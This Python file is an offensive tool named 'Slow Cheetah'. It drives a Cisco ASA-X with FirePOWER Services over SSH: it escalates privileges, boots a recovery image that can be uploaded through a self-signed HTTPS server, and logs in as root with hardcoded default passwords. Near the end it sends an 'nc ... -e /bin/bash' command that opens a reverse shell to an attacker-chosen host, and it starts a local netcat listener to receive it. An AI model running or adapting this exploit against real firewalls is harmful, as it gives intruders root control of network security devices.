import re
import os
import ssl
import sys
import time
import shutil
import paramiko
import argparse
from threading import Thread
from http.server import HTTPServer, SimpleHTTPRequestHandler

def banner():
    print("")
    print("   _____ __                 ________              __        __")  
    print("  / ___// /___ _      __   / ____/ /_  ___  ___  / /_____ _/ /_") 
    print("  \__ \/ / __ \ | /| / /  / /   / __ \\/ _ \\/ _ \\/ __/ __ `/ __ \\")
    print(" ___/ / / /_/ / |/ |/ /  / /___/ / / /  __/  __/ /_/ /_/ / / / /")
    print("/____/_/\____/|__/|__/   \____/_/ /_/\___/\___/\__/\__,_/_/ /_/")
    print("")
    print("   🦞 ASA-X with FirePOWER Service Boot Image Root Shell 🦞")
    print("")
                                                                

# Handles new line insertion of verbose mode is enabled
def do_print(text, verbose):
    if verbose == True:
        print('\n' + text)
    else:
        print(text)

# Read until "value" is extracted from the stream. If the value is never
# seen then this blocks FOREVER (that's bad programming!). Setting verbose
# to True will cause the input to be written to screen as well.
# @return the ingested data
def read_until(channel, value, verbose):

    output = ''
    
    while output.endswith(value) == False:
        try:
            new_data = channel.recv(1).decode('utf-8')
            if verbose:
                print(new_data, end='')
            output += new_data
        except:
            pass

    return output

# Read until "good" or "bad" is extracted from the stream. If the values
# are never seen then this blocks FOREVER (also bad programming!). Setting
# verbose to True will cause the input to be written to screen as well.
# @return True if we found "good" and False otherwise
def read_until_either(channel, good, bad, verbose):

    output = ''
    
    while output.endswith(good) == False and output.endswith(bad) == False:
        try:
            new_data = channel.recv(1).decode('utf-8')
            if verbose:
                print(new_data, end='')
            output += new_data
        except:
            pass

    return output.endswith(good)

# Searches disk0: on the ASA for boot images that we might be able to use
# in our assault.
def search_for_boot_images(channel, verbose):
    channel.send('show disk0:\n')
    output = read_until(channel, '> ', verbose)
    if verbose:
        print('\n')
    matches = re.findall(r'(asasfr-[^\s]+img)', output)
    if len(matches) == 0:
        print("[-] No boot images found!")
 
    for match in matches:
        print('[+] Found: disk0:/' + match)

# Escalate to an enable prompt
def escalate(channel, verbose):
    channel.send('en\n')
    read_until(channel, 'Password: ', verbose)
    channel.send(args.enable_password + '\n')
    return read_until_either(channel, '# ', 'Invalid password', verbose)

# Reset the boot image and then attempt to boot our desired image again
def reset_boot_image(channel, image_path, tinycore, verbose):
    channel.send('sw-module module sfr recover stop\n')
    output = read_until(channel, '# ', verbose)
    
    print('\n[!] Resetting SFR module from recover state. Sleeping for 120 seconds to let this take affect.')
    time.sleep(120)
    return install_boot_image(channel, image_path, tinycore, verbose)

# Installs the boot images and begins the recovery process (e.g. boots it). Note that
# this has a recursive call via reset_boot_image: essentially, if there is already an
# active recovery process we want to stop it and do our recovery instead.
# @return True on success and False otherwise
def install_boot_image(channel, image_path, tinycore, verbose):

    channel.send('show module sfr\n')
    output = read_until(channel, '# ', verbose)
    if output.find('sfr Unresponsive') == -1:
        if output.find('sfr Recover') != -1:
            return reset_boot_image(channel, image_path, tinycore, verbose)
        else:
            return False
    else:
        do_print('[+] This may take a few minutes - Booting recover image: ' + image_path, verbose)
        channel.send('sw-module module sfr recover configure image ' + image_path + '\n')
        read_until(channel, '# ', verbose)

        channel.send('debug module-boot\n')
        read_until(channel, '# ', verbose)

        channel.send('sw-module module sfr recover boot\n')
        read_until(channel, 'Recover module sfr? [confirm]', verbose)
        channel.send('\n')
        if tinycore == False:
            read_until(channel, 'Cisco FirePOWER Services Boot Image', verbose)
        else:
            read_until(channel, 'Warning: vlan 0 is not connected to host network', verbose)

    return True

# Configure dhcp for the boot image
def configure_network(channel, verbose):
    channel.send("setup\n")
    read_until(channel, 'Enter a hostname', verbose)
    channel.send("\n")
    read_until(channel, 'Do you want to configure IPv4 address', verbose)
    channel.send("y\n")
    read_until(channel,'Do you want to enable DHCP for IPv4', verbose)
    channel.send("y\n")
    read_until(channel, 'Do you want to configure static', verbose)
    channel.send("n\n")
    read_until(channel, 'Do you want to enable the NTP', verbose)
    channel.send("n\n")
    read_until(channel, 'Apply the change', verbose)
    channel.send("y\n")
    read_until(channel, 'Press ENTER to continue...', verbose)
    channel.send("\n")

def http_server_func(ip, port):
  os.system("openssl req -nodes -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -subj '/CN=mylocalhost'")
  httpd = HTTPServer((ip, port), SimpleHTTPRequestHandler)
  sslctx = ssl.SSLContext()
  sslctx.check_hostname = False 
  sslctx.load_cert_chain(certfile='cert.pem', keyfile="key.pem")
  httpd.socket = sslctx.wrap_socket(httpd.socket, server_side=True)
  print(f"[+] Server running on https://{ip}:{port}")
  httpd.serve_forever()

def upload_image(rhost, rport, http_addr, http_port, username, password, enable_password, upload_image, verbose):

    client = paramiko.client.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    print("[+] Authenticating to " + rhost + ":" + str(rport) + " as " + username + ":" + password)
    client.connect(rhost, rport, username=username, password=password, allow_agent=False, look_for_keys=False)

    channel = client.invoke_shell()

    read_until(channel, '> ', verbose)
    do_print('[+] Attempting to escalate to an enable prompt', verbose)
    if escalate(channel, verbose) == False:
        do_print('[-] Wrong enable password', verbose)
        return False

    channel.send('copy /noconfirm https://' + http_addr + ':' + str(http_port) + '/' + upload_image + ' disk0:/' + upload_image + '\n')
    return read_until_either(channel, '# ', 'Error', verbose)

if __name__ == '__main__':

    banner()

    top_parser = argparse.ArgumentParser(description='Cisco ASA-X with FirePOWER Services Boot Image Root Shell')
    top_parser.add_argument('--rhost', action="store", dest="rhost", required=True, help="The IPv4 address to connect to via SSH")
    top_parser.add_argument('--rport', action="store", dest="rport", type=int, help="The SSH port to connect to", default="22")
    top_parser.add_argument('--lhost', action="store", dest="lhost", required=True, help="The IPv4 address to establish a reverse shell to")
    top_parser.add_argument('--lport', action="store", dest="lport", type=int, help="The port to establish a reverse shell to", default="1270")
    top_parser.add_argument('--http_addr', action="store", dest="http_addr", help="The IPv4 address to put the HTTPS server on")
    top_parser.add_argument('--http_port', action="store", dest="http_port", type=int, help="The port to to listen the HTTP server on", default="8443")
    top_parser.add_argument('--username', action="store", dest="username", help="The user to log in as", default="cisco")
    top_parser.add_argument('--password', action="store", dest="password", help="The password to log in with", default="cisco123")
    top_parser.add_argument('--search', action='store_true', dest="search", help="Search the ASA disk for boot images", default=False)
    top_parser.add_argument('--image_path', action="store", dest="image_path", help="The path to the image on the ASA", default="")
    top_parser.add_argument('--upload_image', action="store", dest="upload_image", help="A boot image to upload", default="")
    top_parser.add_argument('--tinycore', action="store_true", dest="tinycore", help="Indicates if the boot image is a non-Cisco ISO", default=False)
    top_parser.add_argument('--enable-password', action="store", dest="enable_password", help="The enable password to escalate with", default="")
    top_parser.add_argument('--nc-path', action="store", dest="ncpath", help="The path to nc", default="/usr/bin/nc")
    top_parser.add_argument('--verbose', action="store_true", dest="verbose", help="Print SSH output", default=False)
    args = top_parser.parse_args()

    verbose = args.verbose

    if args.search == False and not args.image_path and not args.upload_image:
        print('[-] User must specifiy search, image_path, or upload_image')
        sys.exit(0)

    if args.upload_image:
        if not args.http_addr:
            print('[-] User must provide an HTTP bind address.')
            sys.exit(0)

        shutil.copy(args.upload_image, './')

        print('[+] Spinning up HTTPS server thread')
        http_thread = Thread(target=http_server_func, args=(args.http_addr, args.http_port, ))
        http_thread.setDaemon(True)
        http_thread.start()

        # let the http server spin up
        time.sleep(3)
        if upload_image(args.rhost, args.rport, args.http_addr, args.http_port, args.username, args.password, args.enable_password, os.path.basename(args.upload_image), verbose) == False:
            sys.exit(0)
        
        args.image_path = "disk0:/" + os.path.basename(args.upload_image)
       

    client = paramiko.client.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    print("[+] Authenticating to " + args.rhost + ":" + str(args.rport) + " as " + args.username + ":" + args.password)
    client.connect(args.rhost, args.rport, username=args.username, password=args.password, allow_agent=False, look_for_keys=False)

    channel = client.invoke_shell()

    read_until(channel, '> ', verbose)

    if args.search == True:
        search_for_boot_images(channel, verbose)
        sys.exit(0)

    if not args.image_path:
        do_print('[-] No image path provided.', verbose)
        sys.exit(0)
        
    do_print('[+] Attempting to escalate to an enable prompt', verbose)
    if escalate(channel, verbose) == False:
        do_print('[-] Wrong enable password', verbose)
        sys.exit(0)


    do_print('[+] Attempting to start the provided boot image', verbose)
    if install_boot_image(channel, args.image_path, args.tinycore, verbose) == False:
        do_print('[-] sfr module not in uninitialized state', verbose)
        sys.exit(0)

    if args.tinycore:
        do_print('[+] Executing netcat listener.', False)
        do_print('[+] Using ' + args.ncpath, False)
        do_print('[+] Please wait...', False)
        os.execv(args.ncpath, [args.ncpath, '-lvnp ' + str(args.lport)])

    do_print('[+] Attempting to drop to the SFR console', verbose)
    channel.send('session sfr console\n')
    if read_until_either(channel, "Escape character sequence is 'CTRL-^X'.", "ERROR:", verbose) == False:
        do_print('[-] Encountered an error attempting to reach the SFR console', verbose)
        sys.exit(0)

    channel.send('\n')
    read_until(channel, 'asasfr login: ', verbose)

    do_print('[+] Authenticating to the SFR terminal...', verbose)
    channel.send('admin\n')
    read_until(channel, 'Password: ', verbose)
    channel.send('Admin123\n')
    read_until(channel, 'asasfr-boot>', verbose)

    do_print('[+] Configuring DHCP...', verbose)
    configure_network(channel, verbose)

    do_print('[+] Logging out...', verbose)
    read_until(channel, 'asasfr-boot>', verbose)
    channel.send('exit\n')

    do_print(channel, 'Logging in as root:cisco123')
    read_until(channel, 'asasfr login: ', verbose)
    channel.send('root\n')
    read_until(channel, 'Password: ', verbose)
    channel.send('cisco123\n')
    read_until(channel, 'root@', verbose)
    
    do_print(channel, '[+] Got the root shell. Spawning the listener...')
    pid = os.fork()
    if pid == 0:
        time.sleep(3)
        do_print('[+] Sending reverse shell', verbose)
        channel.send('nc ' + args.lhost + ' ' + str(args.lport) + ' -e /bin/bash &\n')
        read_until(channel, 'root@', verbose)
        channel.send('exit\n')
    else:
        print('[+] Executing netcat listener')
        print('[+] Using ' + args.ncpath)
        os.execv(args.ncpath, [args.ncpath, '-lvnp ' + str(args.lport)])

